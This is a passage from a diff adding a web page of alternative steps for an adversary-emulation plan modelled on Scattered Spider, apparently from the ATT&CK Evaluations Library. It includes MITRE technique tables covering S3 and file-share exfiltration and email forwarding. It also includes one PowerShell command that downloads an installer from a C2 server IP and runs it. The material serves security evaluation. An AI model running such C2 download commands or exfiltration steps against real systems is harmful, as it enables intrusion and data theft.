6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>T1567.002</td>
+<td>Exfiltration Over Web Services: Exfiltration to Cloud Storage</td>
+<td>Windows, Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider exfiltrates Wekan data to attacker S3 bucket</td>
+<td>fishmonger (10.55.4.102), rookery (10.212.3.107), dragonpit (10.212.3.105)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-7---cyberduck-installer-download-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---cyberduck-installer-download-fails">#</doc-anchor-trigger>
+        <span>Step 7 - CyberDuck Installer Download Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-37">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-37">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If the CyberDuck installer fails to download, perform the following alternative
+steps.</p>
+<doc-anchor-target id="procedures-23">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-23">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Tactical RMM session, open an admin PowerShell prompt if one does
+not already exist, and execute the following commands to download the CyberDuck
+installer from the C2 server and install CyberDuck.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">curl http://174.3.0.70/files/cyberduck_installer.exe -O cyberduck_installer.exe; .\cyberduck_installer.exe</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-23">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-23">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider downloads and installs Cyberduck</td>
+<td>fishmonger (10.55.4.102)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-7---cyberduck-fails-to-enumerate-s3-bucket-contents">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---cyberduck-fails-to-enumerate-s3-bucket-contents">#</doc-anchor-trigger>
+        <span>Step 7 - CyberDuck Fails to Enumerate S3 Bucket Contents</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-38">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-38">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-7---cyberduck-fails-to-exfiltrate-s3-bucket-contents">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---cyberduck-fails-to-exfiltrate-s3-bucket-contents">#</doc-anchor-trigger>
+        <span>Step 7 - CyberDuck Fails to Exfiltrate S3 Bucket Contents</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-39">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-39">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+<doc-anchor-target id="step-7---outlook-email-forwarding-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---outlook-email-forwarding-fails">#</doc-anchor-trigger>
+        <span>Step 7 - Outlook Email Forwarding Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-40">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-40">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that the operator fails to
+forward victim emails to the adversary email.</p>
+<doc-anchor-target id="step-7---cyberduck-fails-to-exfitrate-file-share-contents">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---cyberduck-fails-to-exfitrate-file-share-contents">#</doc-anchor-trigger>
+        <span>Step 7 - CyberDuck Fails to Exfitrate File Share Contents</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-41">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-41">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps available for this step.</p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/scattered_spider/emulation_plan/scattered_spider_scenario/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Scattered Spider Scenario</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/scattered_spider/resources/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">Scattered Spider Resources</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                        <li>
+                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-footer-link hover:text-footer-link-hover md:mb-0" href="https://github.com/attackevals/ael">
+                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                    <g fill="currentColor">
+                                                        <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
+                                                    </g>
+                                                </svg>
+                                                <span>ATTACK Evaluations Library GitHub</span>
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Scattered Spider Scenario Alternative Steps", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
